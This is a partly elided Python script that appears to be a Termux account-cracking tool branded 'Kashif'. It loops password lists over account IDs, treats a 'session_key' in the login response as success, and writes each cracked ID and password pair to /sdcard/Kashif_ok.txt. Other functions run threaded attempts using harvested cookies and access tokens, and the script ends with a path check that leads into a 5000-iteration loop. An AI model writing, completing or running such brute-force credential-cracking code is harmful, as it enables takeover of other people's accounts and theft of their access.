...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        print(50*"-")
                        print(f" 15-Days Price : Free")
                        print(f" 1-Month Price : Free")
                        print(50*"-")
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[Kashif] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[Kashif-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/Kashif_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/Kashif_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
def new_file(cookies,access_token):
        ...
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"Kashif{str(random.randint(0,90))}.txt"
        except:
                son = f"Kashif {str(random.randint(10,50))}.txt"
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/Kashif' in datar:
        pass
else:
        for i in range(5000):
